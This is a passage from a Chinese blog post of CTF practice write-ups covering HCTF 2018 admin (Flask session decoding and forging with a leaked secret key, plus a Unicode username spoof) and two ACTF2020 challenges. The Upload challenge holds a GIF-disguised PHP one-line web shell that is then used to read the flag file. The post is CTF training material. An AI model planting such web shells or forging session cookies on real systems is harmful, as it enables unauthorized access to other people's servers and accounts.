+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;&lt;/h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;hctf&#123;xxxxxxxxx&#125;&lt;/h1&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&lt;!-- you are not admin --&gt;</span><br><span class="line">&lt;h1 class=&quot;nav&quot;&gt;Welcome to hctf&lt;/h1&gt;</span><br><span class="line"> </span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当 current_user.is_authenticated and session[‘name’] 为 admin 时，得到 flag</p>
+<p>flask的session是存储在客户端cookie中的，而且flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br>具体参考:<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
+<p>我们可以用python脚本把flask的session解密出来，但是如果想要加密伪造生成我们自己的session的话，还需要知道flask用来签名的SECRET_KEY</p>
+<p>登录成功的session</p>
+<p><img src="https://img-blog.csdnimg.cn/20210119140815640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>Cookie: session：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJxFkMFuwjAMhl9l8plDW9ZLJQ6TUlCR7CoopWsuqCulaUKYVEClQbz7ApO2g2XJv_39tu-wOwztWUFyGa7tDHb9HpI7vH1BAqTNO9kiplLqXCiFOh2x5KG0UpH7cDlrRnImIL01leA3yVRPrAukVoaYmVCsTc54iKtNT3bpa0Uoy2IidjxKloWVbiJZ8jgXZpQ2uyHbGyqzCe1aey_PLyK06ZgzjP2MQr8LsiaoyrWtLM6RZXPU22fvAh4zaM7DYXf5Nu3p_wSRRtLyQAozyRWfyKYOXTdVPohxh2KrMFr2yExMz-yaKOeLF663ddf-kepPqTbjr3KqrRcghBlcz-3w-hmEATx-AHWnbEs.YAZ24Q.SU9_Oj4oC9Dc8GfEdVDHFykxF38</span><br></pre></td></tr></table></figure>
+
+<p>python3 session解密脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line"> </span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line"> </span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line"> </span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of an exception&#x27;)</span><br><span class="line"> </span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before decoding the payload&#x27;)</span><br><span class="line"> </span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line"> </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://img-blog.csdnimg.cn/2021011914175025.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>解密后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;039dac03caafb0abd828e2e253a9aa62f0f33a93369b1ea5c78586009257af2c79661f6bbca7b4fc785887c36e02da609a3ce80854438b57105ccb236b4d8d9f&#x27;, &#x27;csrf_token&#x27;: b&#x27;ebd5903b3236607bd339a7bf53eb6016abef6376&#x27;, &#x27;image&#x27;: b&#x27;JT3H&#x27;, &#x27;name&#x27;: &#x27;root&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>想要加密伪造生成我们自己的 session 的话，还需要知道 flask 用来签名的 SECRET_KEY ，在 Github 源码 config.py 处</p>
+<p>hctf_flask/app/config.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">class Config(object):</span><br><span class="line">    SECRET_KEY = os.environ.get(&#x27;SECRET_KEY&#x27;) or &#x27;ckj123&#x27;</span><br><span class="line">    SQLALCHEMY_DATABASE_URI = &#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = True</span><br></pre></td></tr></table></figure>
+
+<p>SECRET_KEY=ckj123</p>
+<p>session 加密用的是 GitHub 上的一个脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
+<p>将name改为 admin</p>
+<p><img src="https://img-blog.csdnimg.cn/2021011914353961.png" alt="在这里插入图片描述"></p>
+<p>加密得到:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kMuKwkAQRX9lqLUL89oILhw6SgJVjZhMU70RHzFJJ-1AVKIt_vs0DripRV3uKU49YXsaqksDs-twqyawbY8we8LXHmaAAhO9WhoUZFgtLZvvhu06RtP0aMsHFdRItWzI5BZX7DBME_RTquyuVRqwO8RU1CGKRYKmjFjxw-8ST7tro1u21FCYTbXFSIoyluJo0OkeRd5xwaNUqeOwjFHUAYm1k6ssIJeOpDzBZI6s74qmk4rn8JrA4TKcttffrjp_FLTKOyq6EcPMocGQzCLyCg5d70_n1iv0bHjEQnu1H0sGI6rnb1xrd3X1IW36tdss_pPzzvoAdkfbnmECt0s1vP8GwRRefxm6bUw.YAZ9Lg.FLiYehFl3WVhFiBZtpf2A00DHyg</span><br></pre></td></tr></table></figure>
+
+<p>将正确的session放入</p>
+<p><img src="https://img-blog.csdnimg.cn/20210119143432359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>得到flag</p>
+<h3 id="解法二-Unicode-欺骗"><a href="#解法二-Unicode-欺骗" class="headerlink" title="解法二:Unicode 欺骗"></a>解法二:Unicode 欺骗</h3><p><a target="_blank" rel="noopener" href="https://unicode-table.com/en/1D2E/">https://unicode-table.com/en/1D2E/</a> ,在这个网站上找字符。</p>
+<p>我们可以发现注册登录修改密码都用到了strlower转换成小写。而且这个函数是自定义的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def strlower(username):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    return username</span><br></pre></td></tr></table></figure>
+
+
+<p>对于nodeprep.prepare函数就存在漏洞</p>
+<p>对于字符ᴬ，调用一次函数会转换成A,再调用一次会转换成a</p>
+<p>  ᴬdmin 在注册时会被 nodeprep.prepare 函数转为 Admin  </p>
+<p>当登陆后更改密码时会被 strlower() 函数转为 admin</p>
+<p>即更改 admin 账户的密码实现登陆</p>
+<h3 id="解法三-玄学大法"><a href="#解法三-玄学大法" class="headerlink" title="解法三: 玄学大法"></a>解法三: 玄学大法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账户admin</span><br><span class="line">密码123 </span><br></pre></td></tr></table></figure>
+
+<p>得到flag :satisfied:</p>
+<p>参考:</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f92311564ad0">https://www.jianshu.com/p/f92311564ad0</a></p>
+<p><a target="_blank" rel="noopener" href="https://ba2in9a.top/hctf-2018-admin/">https://ba2in9a.top/hctf-2018-admin/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zssblog.top/2020/05/03/HCTF-2018-admin-wp/#%E4%BC%AA%E9%80%A0session">https://zssblog.top/2020/05/03/HCTF-2018-admin-wp/#%E4%BC%AA%E9%80%A0session</a></p>
+<h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>好像 php5  phtml 都没过滤</p>
+<p>直接用下面这个打进去了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;flag&#x27;]);&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>额 打开叫我们寻找源文件</p>
+<p>本来用dirsearch扫了一会  发现buu好像会拦包，罢了罢了 手测吧 </p>
+<p>发现 index.php.apk 有源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题就是弱类型比较</p>
+<p>get传参:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/01/12/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/01/15/Hexo%E4%B8%AD%E4%BD%BF%E7%94%A8emoji%E8%A1%A8%E6%83%85/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Hexo中使用emoji表情
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/01/09/php$$%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">记一题php$$变量覆盖</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+    
+  </div>
+</body>
+<!-- 三角彩带背景 -->
+  <canvas id="evanyou-canvas" style="opacity: 0.3; position: fixed; top: 0px; left: 0px; z-index: -1; width: 100%; height: 100%; pointer-events: none;"></canvas>
+  <script src="https://cdn.jsdelivr.net/gh/XXXZhy/Blog_Image/js/evanyou_canvas.js"></script>
+</html>
